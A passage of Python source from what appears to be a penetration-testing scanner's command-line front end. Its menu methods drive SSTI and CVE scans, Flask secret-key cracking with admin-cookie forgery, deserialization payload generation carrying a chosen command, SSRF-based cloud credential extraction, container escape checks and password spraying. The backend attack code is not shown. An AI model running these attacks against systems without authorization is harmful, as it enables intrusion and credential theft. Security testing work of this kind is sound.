        console.print(f"\n[bold magenta][*] SSTI BLIND DETECTION (TPLmap) on {self.target}[/bold magenta]")
        url = f"{self.protocol}{self.target}"
        param = Prompt.ask("[yellow]Parameter to test (blank for auto)[/yellow]", default="")
        param = param.strip() if param.strip() else None
        with console.status("[bold magenta]Testing blind SSTI (time-based + boolean-based)...[/bold magenta]"):
            result = run_tplmap_scan(url, scan_type='blind_detect', param=param)
        self.results['findings']['tplmap_blind_detect'] = result
        if result.get('vulnerable'):
            technique = result.get('details', {}).get('technique', 'Unknown')
            engine = result.get('details', {}).get('engine', 'Unknown')
            console.print(f"[bold green][+] BLIND SSTI DETECTED! Technique: {technique}, Engine: {engine}[/bold green]")
            for f in result.get('findings', []):
                console.print(f"  [yellow]Evidence: {f.get('evidence', '')[:100]}[/yellow]")
        else:
            console.print("[green][+] No blind SSTI vulnerability detected[/green]")

    def _scan_nuclei_template(self):
        """Nuclei-Style Template Scan - All templates"""
        console.print(f"\n[bold cyan][*] NUCLEI-STYLE TEMPLATE SCAN on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Running all Nuclei-style templates (50+ templates)...[/bold cyan]"):
            result = run_nuclei_scan(url, scan_type='all')
        self.results['findings']['nuclei_template'] = result
        matched = result.get('details', {}).get('templates_matched', 0)
        by_sev = result.get('details', {}).get('by_severity', {})
        if result.get('vulnerable'):
            console.print(f"[bold red][!!!] VULNERABILITIES FOUND: {matched} template(s) matched[/bold red]")
            for sev, count in by_sev.items():
                if count > 0:
                    color = {'critical': 'bold red', 'high': 'red', 'medium': 'yellow', 'low': 'cyan'}.get(sev, 'dim')
                    console.print(f"  [{color}]{sev.upper()}: {count}[/{color}]")
        else:
            console.print("[green][+] No vulnerabilities found with current templates[/green]")

    def _scan_nuclei_cve(self):
        """Nuclei-Style CVE Scan - Known CVE templates"""
        console.print(f"\n[bold red][*] NUCLEI-STYLE CVE SCAN on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Running CVE templates (Apache, F5, Log4Shell, Struts, Rails)...[/bold red]"):
            result = run_nuclei_scan(url, scan_type='cve')
        self.results['findings']['nuclei_cve'] = result
        matched = result.get('details', {}).get('templates_matched', 0)
        if result.get('vulnerable'):
            console.print(f"[bold red][!!!] CVE MATCHES: {matched}[/bold red]")
            for f in result.get('findings', [])[:10]:
                sev = f.get('severity', 'info')
                console.print(f"  [red][{sev.upper()}] {f.get('template_name', 'Unknown')} ({f.get('template_id', '')})[/red]")
        else:
            console.print("[green][+] No known CVEs matched[/green]")

    def _scan_nuclei_exposed_panels(self):
        """Nuclei-Style Exposed Panels Scan"""
        console.print(f"\n[bold yellow][*] NUCLEI-STYLE EXPOSED PANELS SCAN on {self.target}[/bold yellow]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold yellow]Scanning for exposed admin panels (phpMyAdmin, Jenkins, Grafana, Kibana, etc.)...[/bold yellow]"):
            result = run_nuclei_scan(url, scan_type='exposed_panels')
        self.results['findings']['nuclei_exposed_panels'] = result
        matched = result.get('details', {}).get('templates_matched', 0)
        if result.get('vulnerable'):
            console.print(f"[bold red][!!!] EXPOSED PANELS: {matched}[/bold red]")
            for f in result.get('findings', []):
                console.print(f"  [yellow]{f.get('template_name', 'Unknown')} - {f.get('findings', [{}])[0].get('url', 'N/A') if f.get('findings') else 'N/A'}[/yellow]")
        else:
            console.print("[green][+] No exposed admin panels detected[/green]")

    def _scan_nuclei_default_creds(self):
        """Nuclei-Style Default Credentials Scan"""
        console.print(f"\n[bold red][*] NUCLEI-STYLE DEFAULT CREDENTIALS SCAN on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Testing for default credentials (Tomcat, Jenkins, RabbitMQ, etc.)...[/bold red]"):
            result = run_nuclei_scan(url, scan_type='default_creds')
        self.results['findings']['nuclei_default_creds'] = result
        matched = result.get('details', {}).get('templates_matched', 0)
        if result.get('vulnerable'):
            console.print(f"[bold red][!!!] DEFAULT CREDENTIALS: {matched}[/bold red]")
            for f in result.get('findings', []):
                console.print(f"  [red]{f.get('template_name', 'Unknown')} - severity: {f.get('severity', 'N/A')}[/red]")
        else:
            console.print("[green][+] No default credentials detected[/green]")

    def _scan_nuclei_full(self):
        """Nuclei-Style Full Scan - All templates with detailed output"""
        console.print(f"\n[bold red][*] NUCLEI-STYLE FULL SCAN on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Running comprehensive Nuclei-style scan (all categories, all templates)...[/bold red]"):
            result = run_nuclei_scan(url, scan_type='full')
        self.results['findings']['nuclei_full'] = result
        matched = result.get('details', {}).get('templates_matched', 0)
        by_sev = result.get('details', {}).get('by_severity', {})
        by_cat = result.get('details', {}).get('by_category', {})
        if result.get('vulnerable'):
            console.print(f"[bold red][!!!] FULL SCAN RESULTS: {matched} finding(s)[/bold red]")
            # Severity summary
            for sev in ['critical', 'high', 'medium', 'low', 'info']:
                if by_sev.get(sev, 0) > 0:
                    color = {'critical': 'bold red', 'high': 'red', 'medium': 'yellow', 'low': 'cyan'}.get(sev, 'dim')
                    console.print(f"  [{color}]{sev.upper()}: {by_sev[sev]}[/{color}]")
            # Category summary
            for cat, count in by_cat.items():
                console.print(f"  [cyan]{cat}: {count}[/cyan]")
            # Top findings
            for f in result.get('findings', [])[:15]:
                sev = f.get('severity', 'info')
                name = f.get('template_name', 'Unknown')
                console.print(f"  [{sev}] {name}")
        else:
            console.print("[green][+] No vulnerabilities found with full Nuclei-style scan[/green]")

    # ========================================================================
    # v5.0 FUSION Batch 5 - Session Security + Deserialization Engines (Task 3c) - IDs 194-203
    # ========================================================================

    def _scan_flask_session_brute(self):
        """Flask Session Decode/Brute Force (Flask-Unsign Fusion)"""
        console.print(f"\n[bold cyan][*] Flask Session Decode/Brute Force on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"

        # Try to get Flask session cookie from target
        cookie_value = Prompt.ask("[cyan]Enter Flask session cookie value (or press Enter to auto-extract)[/cyan]",
                                  default="")
        if not cookie_value.strip():
            # Auto-extract from target
            try:
                resp = self.session.get(url, timeout=DEFAULT_TIMEOUT, verify=False, allow_redirects=True)
                for cookie_name in resp.cookies:
                    if cookie_name.lower() in ['session', 'flask_session']:
                        cookie_value = resp.cookies[cookie_name]
                        console.print(f"  [green]Auto-extracted cookie '{cookie_name}': {cookie_value[:50]}...[/green]")
                        break
            except Exception:
                pass

        if not cookie_value.strip():
            console.print("[yellow][!] No Flask session cookie provided or found[/yellow]")
            return

        wordlist = Prompt.ask("[cyan]Enter wordlist path (or press Enter for built-in keys)[/cyan]",
                              default="")
        wl = wordlist.strip() if wordlist.strip() else None

        with console.status("[bold magenta]Decoding Flask session + brute-forcing secret key...[/bold magenta]"):
            result = run_session_security_scan(self.target, scan_type='flask_bruteforce',
                                                cookie_value=cookie_value, wordlist=wl)
        self.results['findings']['flask_session_brute'] = result
        if result.get('vulnerable'):
            key_found = result.get('details', {}).get('summary', {}).get('flask_bruteforce', {}).get('details', {}).get('key_found')
            if key_found:
                console.print(f"[bold red][!!!] FLASK SECRET KEY CRACKED: '{key_found}'[/bold red]")
                forged = result.get('details', {}).get('summary', {}).get('flask_bruteforce', {}).get('details', {}).get('forged_cookie')
                if forged:
                    console.print(f"  [yellow]Forged admin cookie: {forged[:80]}...[/yellow]")
            else:
                console.print(f"[bold yellow][!] Flask session decoded but key not cracked[/bold yellow]")
        else:
            console.print("[green][+] Flask session decoded but no vulnerabilities found[/green]")

    def _scan_session_cookie_security(self):
        """Session Cookie Security Check (Secure/HttpOnly/SameSite)"""
        console.print(f"\n[bold cyan][*] Session Cookie Security Check on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Analyzing cookie security flags (Secure, HttpOnly, SameSite, Path, Domain)...[/bold cyan]"):
            result = run_session_security_scan(self.target, scan_type='cookie_security')
        self.results['findings']['session_cookie_security'] = result
        insecure = result.get('details', {}).get('summary', {}).get('cookie_security', {}).get('details', {}).get('insecure_cookies', [])
        score = result.get('details', {}).get('summary', {}).get('cookie_security', {}).get('details', {}).get('security_score', 100)
        if insecure:
            console.print(f"[bold red][!] {len(insecure)} insecure cookies found! Security score: {score}/100[/bold red]")
            for c in insecure[:8]:
                console.print(f"  [yellow]Cookie '{c.get('name')}': {', '.join(c.get('issues', []))}[/yellow]")
        else:
            console.print(f"[green][+] All cookies properly secured (Score: {score}/100)[/green]")

    def _scan_session_fixation(self):
        """Session Fixation Test (4 Tests)"""
        console.print(f"\n[bold magenta][*] Session Fixation Test on {self.target}[/bold magenta]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold magenta]Testing session fixation (pre-auth retention, URL session ID, cookie injection, SameSite)...[/bold magenta]"):
            result = run_session_security_scan(self.target, scan_type='session_fixation')
        self.results['findings']['session_fixation'] = result
        if result.get('vulnerable'):
            vuln_count = len([f for f in result.get('findings', []) if f.get('type') != 'test_error'])
            console.print(f"[bold red][!!!] SESSION FIXATION VULNERABLE! {vuln_count} issues found[/bold red]")
            for f in result.get('findings', [])[:6]:
                if f.get('type') != 'test_error':
                    console.print(f"  [yellow]{f.get('type')}: {f.get('description', '')[:80]}[/yellow]")
        else:
            console.print("[green][+] No session fixation vulnerabilities detected[/green]")

    def _scan_session_security_full(self):
        """Session Security Full Scan (Flask Decode + Brute + Cookie Security + Fixation + JWT)"""
        console.print(f"\n[bold red][*] SESSION SECURITY FULL SCAN on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"

        cookie_value = Prompt.ask("[cyan]Enter session cookie value (or press Enter to skip cookie analysis)[/cyan]",
                                  default="")

        with console.status("[bold red]Running full session security scan (Flask + Cookie Security + Fixation + JWT)...[/bold red]"):
            result = run_session_security_scan(self.target, scan_type='full',
                                                cookie_value=cookie_value if cookie_value.strip() else None)
        self.results['findings']['session_security_full'] = result
        scans_run = result.get('details', {}).get('scans_run', [])
        total_findings = len(result.get('findings', []))
        console.print(f"  [green]Scans run: {', '.join(scans_run)}[/green]")
        console.print(f"  [yellow]Total findings: {total_findings}[/yellow]")
        critical = len([f for f in result.get('findings', []) if f.get('severity') == 'Critical'])
        high = len([f for f in result.get('findings', []) if f.get('severity') == 'High'])
        if critical:
            console.print(f"  [red]Critical: {critical}[/red]")
        if high:
            console.print(f"  [red]High: {high}[/red]")

    def _scan_java_deserialization(self):
        """Java Deserialization Detection (Ysoserial Fusion)"""
        console.print(f"\n[bold cyan][*] Java Deserialization Detection on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Detecting Java deserialization (magic bytes, content-type, 18+ endpoints, gadget chains)...[/bold cyan]"):
            result = run_deserialization_scan(self.target, scan_type='java_detect')
        self.results['findings']['java_deserialization'] = result
        if result.get('vulnerable'):
            endpoints = result.get('details', {}).get('summary', {}).get('java_detect', {}).get('details', {}).get('endpoints_vulnerable', [])
            if endpoints:
                console.print(f"[bold red][!!!] JAVA DESERIALIZATION DETECTED![/bold red]")
                for ep in endpoints[:5]:
                    console.print(f"  [yellow]Endpoint: {ep.get('endpoint')} (HTTP {ep.get('status_code')})[/yellow]")
            else:
                console.print(f"[bold yellow][!] Java deserialization indicators found (content-type/signature)[/bold yellow]")
        else:
            console.print("[green][+] No Java deserialization vulnerability detected[/green]")

    def _scan_php_deserialization(self):
        """PHP Deserialization Detection (PHPGGC Fusion)"""
        console.print(f"\n[bold cyan][*] PHP Deserialization Detection on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        param = Prompt.ask("[cyan]Enter parameter name to test (or press Enter for auto-discovery)[/cyan]",
                           default="")
        with console.status("[bold cyan]Detecting PHP deserialization (unserialize, __wakeup, __destruct, 12+ payloads)...[/bold cyan]"):
            result = run_deserialization_scan(self.target, scan_type='php_detect',
                                              param=param.strip() if param.strip() else None)
        self.results['findings']['php_deserialization'] = result
        if result.get('vulnerable'):
            console.print(f"[bold red][!!!] PHP DESERIALIZATION DETECTED![/bold red]")
            for f in result.get('findings', [])[:5]:
                if f.get('severity') in ['High', 'Critical']:
                    console.print(f"  [yellow]{f.get('type')}: {f.get('description', '')[:80]}[/yellow]")
        else:
            console.print("[green][+] No PHP deserialization vulnerability detected[/green]")

    def _scan_python_deserialization(self):
        """Python Pickle Deserialization Detection"""
        console.print(f"\n[bold cyan][*] Python Pickle Deserialization Detection on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Detecting Python pickle deserialization (magic bytes, dangerous opcodes, endpoint testing)...[/bold cyan]"):
            result = run_deserialization_scan(self.target, scan_type='python_detect')
        self.results['findings']['python_deserialization'] = result
        if result.get('vulnerable'):
            opcodes = result.get('details', {}).get('summary', {}).get('python_detect', {}).get('details', {}).get('dangerous_opcodes', [])
            if opcodes:
                console.print(f"[bold red][!!!] DANGEROUS PICKLE OPCODES: {opcodes} - RCE POSSIBLE![/bold red]")
            else:
                console.print(f"[bold yellow][!] Python pickle deserialization indicators found[/bold yellow]")
        else:
            console.print("[green][+] No Python pickle deserialization vulnerability detected[/green]")

    def _scan_deserialization_payload(self):
        """Deserialization Payload Generation (Java/PHP)"""
        console.print(f"\n[bold magenta][*] Deserialization Payload Generation[/bold magenta]")

        console.print("[cyan]Select payload type:[/cyan]")
        console.print("  [1] Java (Ysoserial-style gadget chains)")
        console.print("  [2] PHP (PHPGGC-style gadget chains)")
        choice = Prompt.ask("[cyan]Choice[/cyan]", default="1")

        command = Prompt.ask("[cyan]Enter command to execute[/cyan]", default="id")

        if choice == "1":
            console.print("[cyan]Available Java gadget chains:[/cyan]")
            gadgets = ["CommonsCollections1", "CommonsCollections2", "CommonsCollections5",
                       "CommonsCollections6", "CommonsCollections7", "Spring1", "Spring2",
                       "Groovy1", "Jdk7u21", "ROME", "C3P0", "Hibernate1"]
            for i, g in enumerate(gadgets, 1):
                console.print(f"  [{i}] {g}")
            gadget_choice = Prompt.ask("[cyan]Select gadget[/cyan]", default="6")
            try:
                gadget_idx = int(gadget_choice) - 1
                gadget = gadgets[gadget_idx] if 0 <= gadget_idx < len(gadgets) else "CommonsCollections6"
            except ValueError:
                gadget = "CommonsCollections6"

            with console.status(f"[bold magenta]Generating Java payload: {gadget}...[/bold magenta]"):
                result = run_deserialization_scan(self.target, scan_type='java_payload',
                                                   gadget=gadget, command=command)
            self.results['findings']['java_payload_gen'] = result
            payload_b64 = result.get('details', {}).get('summary', {}).get('java_payload', {}).get('details', {}).get('payload_base64')
            if payload_b64:
                console.print(f"[green][+] Java payload generated ({len(payload_b64)} bytes base64)[/green]")
                console.print(f"  [cyan]Payload: {payload_b64[:100]}...[/cyan]")
            else:
                console.print("[yellow][!] Payload generation failed[/yellow]")

        elif choice == "2":
            console.print("[cyan]Available PHP gadget chains:[/cyan]")
            chains = list(set(v.get('framework', '') for v in [
                {"framework": "Laravel/RCE1"}, {"framework": "Laravel/RCE2"},
                {"framework": "Symfony/RCE1"}, {"framework": "Magento/RCE1"},
                {"framework": "WordPress/PopChain1"}, {"framework": "Yii/RCE1"},
                {"framework": "Guzzle/RCE1"}, {"framework": "Monolog/RCE1"},
            ]))
            php_chains = ["Laravel/RCE1", "Laravel/RCE2", "Symfony/RCE1", "Magento/RCE1",
                          "WordPress/PopChain1", "Yii/RCE1", "Guzzle/RCE1", "Monolog/RCE1",
                          "Drupal/RCE1", "SwiftMailer/RCE1"]
            for i, c in enumerate(php_chains, 1):
                console.print(f"  [{i}] {c}")
            chain_choice = Prompt.ask("[cyan]Select chain[/cyan]", default="1")
            try:
                chain_idx = int(chain_choice) - 1
                chain = php_chains[chain_idx] if 0 <= chain_idx < len(php_chains) else "Laravel/RCE1"
            except ValueError:
                chain = "Laravel/RCE1"

            with console.status(f"[bold magenta]Generating PHP payload: {chain}...[/bold magenta]"):
                result = run_deserialization_scan(self.target, scan_type='php_payload',
                                                   chain=chain, command=command)
            self.results['findings']['php_payload_gen'] = result
            payload = result.get('details', {}).get('summary', {}).get('php_payload', {}).get('details', {}).get('payload_serialized')
            if payload:
                console.print(f"[green][+] PHP payload generated ({len(payload)} bytes)[/green]")
                console.print(f"  [cyan]Serialized: {payload[:120]}...[/cyan]")
                urlencoded = result.get('details', {}).get('summary', {}).get('php_payload', {}).get('details', {}).get('payload_urlencoded')
                if urlencoded:
                    console.print(f"  [yellow]URL-encoded: {urlencoded[:120]}...[/yellow]")
            else:
                console.print("[yellow][!] Payload generation failed[/yellow]")

    def _scan_blind_deserialization(self):
        """Blind Deserialization Detection (5 Techniques)"""
        console.print(f"\n[bold magenta][*] Blind Deserialization Detection on {self.target}[/bold magenta]")
        url = f"{self.protocol}{self.target}"
        callback = Prompt.ask("[cyan]Enter callback URL for OOB detection (or press Enter to skip)[/cyan]",
                              default="")
        with console.status("[bold magenta]Testing blind deserialization (time-based Java/PHP/Python, JNDI callback, error-based)...[/bold magenta]"):
            result = run_deserialization_scan(self.target, scan_type='blind',
                                              callback_url=callback.strip() if callback.strip() else None)
        self.results['findings']['blind_deserialization'] = result
        if result.get('vulnerable'):
            techniques = result.get('details', {}).get('summary', {}).get('blind_detect', {}).get('details', {}).get('techniques_used', [])
            console.print(f"[bold red][!!!] BLIND DESERIALIZATION DETECTED![/bold red]")
            console.print(f"  [yellow]Techniques triggered: {', '.join(techniques)}[/yellow]")
            for f in result.get('findings', [])[:5]:
                if f.get('severity') in ['High', 'Critical']:
                    console.print(f"  [red]{f.get('type')}: {f.get('description', '')[:80]}[/red]")
        else:
            console.print("[green][+] No blind deserialization vulnerability detected[/green]")

    def _scan_deserialization_full(self):
        """Deserialization Full Scan (Java + PHP + Python + Blind + Payloads)"""
        console.print(f"\n[bold red][*] DESERIALIZATION FULL SCAN on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"

        all_results = {}

        with console.status("[bold red]Phase 1: Java Deserialization Detection...[/bold red]"):
            all_results['java'] = run_deserialization_scan(self.target, scan_type='java_detect')
        with console.status("[bold red]Phase 2: PHP Deserialization Detection...[/bold red]"):
            all_results['php'] = run_deserialization_scan(self.target, scan_type='php_detect')
        with console.status("[bold red]Phase 3: Python Pickle Detection...[/bold red]"):
            all_results['python'] = run_deserialization_scan(self.target, scan_type='python_detect')
        with console.status("[bold red]Phase 4: Blind Deserialization Detection...[/bold red]"):
            all_results['blind'] = run_deserialization_scan(self.target, scan_type='blind')
        with console.status("[bold red]Phase 5: Generating test payloads...[/bold red]"):
            all_results['java_payload'] = run_deserialization_scan(self.target, scan_type='java_payload',
                                                                    gadget='CommonsCollections6', command='id')
            all_results['php_payload'] = run_deserialization_scan(self.target, scan_type='php_payload',
                                                                   chain='Laravel/RCE1', command='id')

        self.results['findings']['deserialization_full'] = all_results

        # Summary
        vuln_types = []
        for name, res in all_results.items():
            if res and res.get('vulnerable'):
                vuln_types.append(name)

        if vuln_types:
            console.print(f"[bold red][!!!] DESERIALIZATION VULNERABILITIES FOUND: {', '.join(vuln_types)}[/bold red]")
        else:
            console.print("[green][+] No deserialization vulnerabilities detected across all scan types[/green]")

        for name, res in all_results.items():
            if res:
                findings_count = len(res.get('findings', []))
                console.print(f"  [cyan]{name}: {findings_count} findings[/cyan]")

        for name, res in all_results.items():
            if res:
                findings_count = len(res.get('findings', []))
                console.print(f"  [cyan]{name}: {findings_count} findings[/cyan]")

    # ========================================================================
    # v5.0 FUSION Batch 6 - Cloud + Container Advanced Engines (Task 4a)
    # Scan IDs 204-213
    # ========================================================================

    def _scan_cloud_s3_adv(self):
        """204: Cloud S3 Bucket Enum (Advanced)"""
        console.print(f"\n[bold cyan][*] CLOUD S3 BUCKET ENUM (Advanced) on {self.target}[/bold cyan]")
        with console.status("[bold cyan]Enumerating AWS S3 buckets (38+ permutations)...[/bold cyan]"):
            result = run_cloud_advanced(self.target, scan_type='s3')
        self.results['findings']['cloud_s3_adv'] = result
        details = result.get('details', {})
        buckets = details.get('buckets_found', [])
        public = details.get('public_count', 0)
        denied = details.get('denied_count', 0)
        console.print(f"  [green]Found {len(buckets)} S3 buckets (Public: {public}, Denied: {denied})[/green]")
        if buckets:
            for b in buckets[:10]:
                status_color = 'red' if b.get('status') == 'public_readable' else 'yellow'
                console.print(f"  [{status_color}][{b.get('status')}] {b.get('name')}[/{status_color}]")

    def _scan_cloud_azure_adv(self):
        """205: Cloud Azure Blob Enum (Advanced)"""
        console.print(f"\n[bold cyan][*] CLOUD AZURE BLOB ENUM (Advanced) on {self.target}[/bold cyan]")
        with console.status("[bold cyan]Enumerating Azure Blob containers (19+ patterns)...[/bold cyan]"):
            result = run_cloud_advanced(self.target, scan_type='azure')
        self.results['findings']['cloud_azure_adv'] = result
        details = result.get('details', {})
        containers = details.get('containers_found', [])
        public = details.get('public_count', 0)
        denied = details.get('denied_count', 0)
        console.print(f"  [green]Found {len(containers)} Azure containers (Public: {public}, Denied: {denied})[/green]")
        if containers:
            for c in containers[:10]:
                status_color = 'red' if c.get('status') == 'public_readable' else 'yellow'
                console.print(f"  [{status_color}][{c.get('status')}] {c.get('name')}[/{status_color}]")

    def _scan_cloud_gcp_adv(self):
        """206: Cloud GCP Storage Enum (Advanced)"""
        console.print(f"\n[bold cyan][*] CLOUD GCP STORAGE ENUM (Advanced) on {self.target}[/bold cyan]")
        with console.status("[bold cyan]Enumerating GCP Storage buckets (16+ patterns + API)...[/bold cyan]"):
            result = run_cloud_advanced(self.target, scan_type='gcp')
        self.results['findings']['cloud_gcp_adv'] = result
        details = result.get('details', {})
        buckets = details.get('buckets_found', [])
        public = details.get('public_count', 0)
        denied = details.get('denied_count', 0)
        console.print(f"  [green]Found {len(buckets)} GCP buckets (Public: {public}, Denied: {denied})[/green]")
        if buckets:
            for b in buckets[:10]:
                status_color = 'red' if b.get('status') == 'public_readable' else 'yellow'
                console.print(f"  [{status_color}][{b.get('status')}] {b.get('name')}[/{status_color}]")

    def _scan_cloud_metadata_adv(self):
        """207: Cloud Metadata Extraction (Advanced)"""
        console.print(f"\n[bold red][*] CLOUD METADATA EXTRACTION (Advanced) on {self.target}[/bold red]")
        with console.status("[bold red]Extracting cloud metadata via SSRF (AWS/GCE/Azure/DO/Oracle/Alibaba)...[/bold red]"):
            result = run_cloud_advanced(self.target, scan_type='metadata')
        self.results['findings']['cloud_metadata_adv'] = result
        details = result.get('details', {})
        provider = details.get('cloud_provider', 'none')
        meta_count = len(details.get('metadata_extracted', {}))
        creds = len(details.get('credentials_found', []))
        if provider and provider != 'none':
            console.print(f"  [red][!] Cloud provider detected: {provider}[/red]")
            console.print(f"  [red][!] Metadata keys extracted: {meta_count}[/red]")
            if creds:
                console.print(f"  [bold red][!!!] IAM CREDENTIALS EXTRACTED: {creds}[/bold red]")
        else:
            console.print(f"  [green][+] No cloud metadata accessible (not a cloud instance or SSRF blocked)[/green]")

    def _scan_cloud_credential_adv(self):
        """208: Cloud Credential Scan (Advanced)"""
        console.print(f"\n[bold red][*] CLOUD CREDENTIAL SCAN (Advanced) on {self.target}[/bold red]")
        with console.status("[bold red]Scanning for exposed cloud credentials (14+ credential types)...[/bold red]"):
            result = run_cloud_advanced(self.target, scan_type='credentials')
        self.results['findings']['cloud_credential_adv'] = result
        details = result.get('details', {})
        total_creds = details.get('total_creds', 0)
        if total_creds:
            console.print(f"  [red][!] Found {total_creds} exposed credentials[/red]")
            for c in details.get('credentials_found', [])[:10]:
                color = 'red' if c.get('severity') == 'Critical' else 'yellow'
                console.print(f"  [{color}][{c.get('severity')}] {c.get('credential_type')}: {c.get('match', '***')}[/{color}]")
        else:
            console.print(f"  [green][+] No exposed cloud credentials found[/green]")

    def _scan_cloud_misconfig_adv(self):
        """209: Cloud Misconfiguration Scan (Advanced)"""
        console.print(f"\n[bold red][*] CLOUD MISCONFIGURATION SCAN (Advanced) on {self.target}[/bold red]")
        with console.status("[bold red]Detecting cloud misconfigurations (10+ check types)...[/bold red]"):
            result = run_cloud_advanced(self.target, scan_type='misconfig')
        self.results['findings']['cloud_misconfig_adv'] = result
        details = result.get('details', {})
        misconfigs = details.get('misconfigs_found', [])
        critical = details.get('critical_count', 0)
        high = details.get('high_count', 0)
        medium = details.get('medium_count', 0)
        if misconfigs:
            console.print(f"  [red][!] Found {len(misconfigs)} misconfigurations (Critical: {critical}, High: {high}, Medium: {medium})[/red]")
            for m in misconfigs[:10]:
                color = 'red' if m.get('severity') == 'Critical' else 'yellow' if m.get('severity') == 'High' else 'cyan'
                console.print(f"  [{color}][{m.get('severity')}] {m.get('type')}: {m.get('description', '')[:80]}[/{color}]")
        else:
            console.print(f"  [green][+] No cloud misconfigurations detected[/green]")

    def _scan_cloud_full_adv(self):
        """210: Cloud Full Scan (Advanced - 7 Phases)"""
        console.print(f"\n[bold red][*] CLOUD FULL SCAN (Advanced - 7 Phases) on {self.target}[/bold red]")
        with console.status("[bold red]Running full cloud security assessment (7 phases + bonus DO/Firebase)...[/bold red]"):
            result = run_cloud_advanced(self.target, scan_type='full')
        self.results['findings']['cloud_full_adv'] = result
        summary = result.get('details', {}).get('summary', {})
        if summary:
            console.print(f"  [cyan]Provider: {summary.get('provider', 'Unknown')}[/cyan]")
            console.print(f"  [red]Critical: {summary.get('critical', 0)}[/red]")
            console.print(f"  [yellow]High: {summary.get('high', 0)}[/yellow]")
            console.print(f"  [cyan]Medium: {summary.get('medium', 0)}[/cyan]")
            console.print(f"  [green]S3 Buckets: {summary.get('s3_buckets_found', 0)}[/green]")
            console.print(f"  [green]Azure Blobs: {summary.get('azure_blobs_found', 0)}[/green]")
            console.print(f"  [green]GCP Buckets: {summary.get('gcp_buckets_found', 0)}[/green]")
            console.print(f"  [green]DO Spaces: {summary.get('do_spaces_found', 0)}[/green]")
            console.print(f"  [green]Firebase DBs: {summary.get('firebase_dbs_found', 0)}[/green]")
            console.print(f"  [red]Credentials: {summary.get('credentials_found', 0)}[/red]")
            console.print(f"  [red]Misconfigs: {summary.get('misconfigs_found', 0)}[/red]")
        if result.get('vulnerable'):
            console.print(f"[bold red][!!!] CLOUD VULNERABILITIES FOUND - See details above[/bold red]")
        else:
            console.print("[green][+] No critical cloud vulnerabilities detected[/green]")

    def _scan_container_docker_api_adv(self):
        """211: Container Docker API Detection (Advanced)"""
        console.print(f"\n[bold cyan][*] CONTAINER DOCKER API DETECTION (Advanced) on {self.target}[/bold cyan]")
        with console.status("[bold cyan]Scanning for exposed Docker API (8 ports + 26 paths)...[/bold cyan]"):
            result = run_container_advanced(self.target, scan_type='detect')
        self.results['findings']['container_docker_api_adv'] = result
        details = result.get('details', {})
        endpoints = details.get('api_endpoints_found', [])
        local = details.get('local_docker_available', False)
        if endpoints:
            console.print(f"  [red][!] Found {len(endpoints)} Docker API endpoints[/red]")
            for ep in endpoints:
                console.print(f"  [red]  Port {ep.get('port')}: {ep.get('endpoint')} ({ep.get('status')})[/red]")
        else:
            console.print(f"  [green][+] No exposed Docker API endpoints found[/green]")
        if local:
            console.print(f"  [yellow][*] Local Docker daemon is available[/yellow]")

    def _scan_container_escape_adv(self):
        """212: Container Escape Check (Advanced - 12 Vectors)"""
        console.print(f"\n[bold red][*] CONTAINER ESCAPE CHECK (Advanced - 12 Vectors) on {self.target}[/bold red]")
        with console.status("[bold red]Checking container escape vectors (12+ techniques)...[/bold red]"):
            result = run_container_advanced(self.target, scan_type='escape')
        self.results['findings']['container_escape_adv'] = result
        details = result.get('details', {})
        vectors = details.get('escape_vectors', [])
        critical = details.get('critical_vectors', 0)
        if vectors:
            console.print(f"  [red][!] Found {len(vectors)} escape vectors ({critical} Critical)[/red]")
            for v in vectors:
                color = 'red' if v.get('severity') == 'Critical' else 'yellow'
                console.print(f"  [{color}][{v.get('severity')}] {v.get('vector')}: {v.get('description', '')[:80]}[/{color}]")
                if v.get('exploit'):
                    console.print(f"    [cyan]Exploit: {v.get('exploit')[:80]}[/cyan]")
        else:
            console.print(f"  [green][+] No container escape vectors detected[/green]")

    def _scan_container_full_adv(self):
        """213: Container Full Scan (Advanced - 7 Phases)"""
        console.print(f"\n[bold red][*] CONTAINER FULL SCAN (Advanced - 7 Phases) on {self.target}[/bold red]")
        with console.status("[bold red]Running full container security assessment (7 phases)...[/bold red]"):
            result = run_container_advanced(self.target, scan_type='full')
        self.results['findings']['container_full_adv'] = result
        summary = result.get('details', {}).get('summary', {})
        if summary:
            console.print(f"  [red]Critical: {summary.get('critical', 0)}[/red]")
            console.print(f"  [yellow]High: {summary.get('high', 0)}[/yellow]")
            console.print(f"  [cyan]Medium: {summary.get('medium', 0)}[/cyan]")
            console.print(f"  [green]Docker APIs: {summary.get('docker_api_found', 0)}[/green]")
            console.print(f"  [green]Containers: {summary.get('containers_found', 0)}[/green]")
            console.print(f"  [red]Escape Vectors: {summary.get('escape_vectors', 0)}[/red]")
            console.print(f"  [red]Privileged: {summary.get('privileged_containers', 0)}[/red]")
            console.print(f"  [yellow]K8s APIs: {summary.get('k8s_api_found', 0)}[/yellow]")
        if result.get('vulnerable'):
            console.print(f"[bold red][!!!] CONTAINER VULNERABILITIES FOUND - See details above[/bold red]")
        else:
            console.print("[green][+] No critical container vulnerabilities detected[/green]")

    def _scan_password_spraying(self):
        """214: Password Spraying (CredMaster Fusion)"""
        console.print(f"\n[bold red][*] PASSWORD SPRAYING on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Running password spraying...[/bold red]"):
            result = run_credential_scan(self.target, scan_type='spray')
        self.results['findings']['password_spraying'] = result
        if result.get('vulnerable'):
            console.print(f"[bold red][!!!] VALID CREDENTIALS FOUND![/bold red]")
            for cred in result.get('details', {}).get('valid_credentials', []):
                console.print(f"  [red]{cred.get('username')}:{cred.get('password')} ({cred.get('method')})[/red]")
        else:
